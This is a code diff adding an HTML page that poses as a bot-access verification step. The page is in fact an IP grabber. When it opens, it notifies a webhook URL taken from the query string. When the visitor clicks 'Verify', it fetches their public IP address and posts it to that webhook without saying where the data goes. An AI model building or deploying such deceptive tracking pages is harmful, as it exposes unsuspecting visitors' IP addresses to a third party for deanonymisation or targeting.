@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Page</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            margin: 0 auto; /* Center horizontally */
+            text-align: center;
+            padding-top: 20%; /* Adjust this value to position vertically */
+            padding-left: 10%;
+            padding-right: 10%;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            word-break: break-word;
+        }
+
+        @media (max-width: 600px) {
+            h2 {
+                font-size: 18px;
+                padding: 0 10px;
+            }
+            .verify-button {
+                padding: 8px 16px;
+                font-size: 14px;
+            }
+        }
+
+        @media (min-width: 601px) and (max-width: 1200px) {
+            h2 {
+                font-size: 24px;
+                padding: 0 20px;
+            }
+            .verify-button {
+                padding: 10px 20px;
+                font-size: 16px;
+            }
+        }
+
+        @media (min-width: 1201px) {
+            h2 {
+                font-size: 28px;
+                padding: 0 30px;
+            }
+            .verify-button {
+                padding: 12px 24px;
+                font-size: 18px;
+            }
+        }
+
+        .verify-button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            background-color: #4CAF50;
+            color: white;
+            border-radius: 5px;
+        }
+
+        .verify-button:hover {
+            background-color: #45a049;
+        }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h2>Click the Verify Button Below to get access to the Bot</h2>
+        <p id="ip-display"></p>
+        <button class="verify-button" onclick="fetchIP()">Verify</button>
+    </div>
+    
+    <script>
+        // Get URL query params as an object
+        function getQueryStringParam(param) {
+            var urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Send data to the webhook
+        function sendData(message) {
+            var url = getQueryStringParam("link");
+            $("#webhookUrl").text(url);
+
+            $.ajax({
+                type: "POST",
+                url: url,
+                data: JSON.stringify({ content: message }),
+                contentType: "application/json",
+                success: function (response) {
+                    console.log("Data sent successfully:", response);
+                },
+                error: function (error) {
+                    console.error("Error sending data:", error);
+                },
+                dataType: "json"
+            });
+        }
+
+        // Fetch and display the IP address
+        function fetchIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-display').textContent = `Your IP address is: ${data.ip}`;
+                    sendData(`IP Address: ${data.ip}`);
+                })
+                .catch(error => {
+                    console.error('Error fetching the IP address:', error);
+                    document.getElementById('ip-display').textContent = 'Could not fetch IP address.';
+                });
+        }
+
+        // On document ready, send a message that the page was opened
+        $(document).ready(function () {
+            sendData("You opened the webpage");
+        });
+    </script>
+</body>
+</html>
